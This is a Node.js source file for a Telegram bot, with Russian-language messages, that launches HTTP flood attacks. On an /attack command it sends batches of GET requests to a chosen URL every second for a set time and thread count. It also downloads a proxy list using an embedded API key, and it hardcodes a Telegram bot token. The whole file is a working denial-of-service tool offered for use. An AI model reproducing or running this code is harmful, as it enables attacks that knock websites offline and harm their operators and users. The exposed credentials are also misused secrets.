const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const botToken = '6364882254:AAGuVSXCsex3NalDiYSy7N5wejIwmqqHTgA'; // Replace with your bot token
const bot = new TelegramBot(botToken, { polling: true });

let attackInterval = null;
let isAttackStarted = false;
let proxies = [];

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const message = `
  Добро пожаловать в бота!

  Введите /stop, чтобы остановить атаку.
  
  Чтобы начать атаку, используйте следующую команду:
  /attack <url> <time> <req_per_ip> <threads>

  Пример:
  /attack http://example.com 135 65 5
    `;
  bot.sendMessage(chatId, message);
});

bot.onText(/\/attack (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandParams = match[1].split(' ');

  if (commandParams.length !== 4) {
    const message = 'Неверная команда! Пожалуйста, укажите требуемые параметры: URL, время, req_per_ip и threads.';
    bot.sendMessage(chatId, message);
    return;
  }

  if (isAttackStarted) {
    const message = 'Атака уже запущена!';
    bot.sendMessage(chatId, message);
    return;
  }

  const target = commandParams[0];
  const time = parseInt(commandParams[1]);
  const req_per_ip = parseInt(commandParams[2]);
  const threads = parseInt(commandParams[3]);

  attackInterval = setInterval(sendReq, 1000);
  isAttackStarted = true;

  // Отправляем сообщение об успешной атаке
  const successMessage = `Атака успешно запущена на ${target} в течение ${time} секунд с ${threads} потоками и ${req_per_ip} запросов на IP.`;
  sendMessageToUser(chatId, successMessage);

  setTimeout(() => {
    clearInterval(attackInterval);
    isAttackStarted = false;
    const message = 'Атака завершена.';
    bot.sendMessage(chatId, message);
  }, time * 1000);

  async function sendReq() {
    const requests = [];
    for (let i = 0; i < threads; ++i) {
      for (let j = 0; j < req_per_ip; ++j) {
        requests.push(axios.get(target));
      }
    }

    try {
      await Promise.all(requests);
    } catch (error) {
      console.log(error.message);
    }
  }
});

bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  clearInterval(attackInterval);
  isAttackStarted = false;
  const message = 'Атака остановлена.';
  bot.sendMessage(chatId, message);
});

// Automatically scrape proxies and save them to a file
async function scrapeProxies() {
  try {
    const response = await axios.get('http://proxy11.com/api/proxy.txt?key=NTgwNw.ZLfQTg.VG3yDTx8luSG0H35rzBCrSTBc70');
    proxies = response.data.split('\r\n');
    fs.writeFileSync('proxies.txt', proxies.join('\n'));
    console.log('Proxies have been scraped and saved to proxies.txt');
  } catch (error) {
    console.error('Error scraping proxies:', error.message);
  }
}

// Call the proxy scraper function when the script starts
scrapeProxies();

process.on('uncaughtException', function (err) {
  console.log(err);
});

process.on('unhandledRejection', function (err) {
  console.log(err);
});

// Функция для отправки сообщения пользователю
function sendMessageToUser(chatId, message) {
  bot.sendMessage(chatId, message);
}
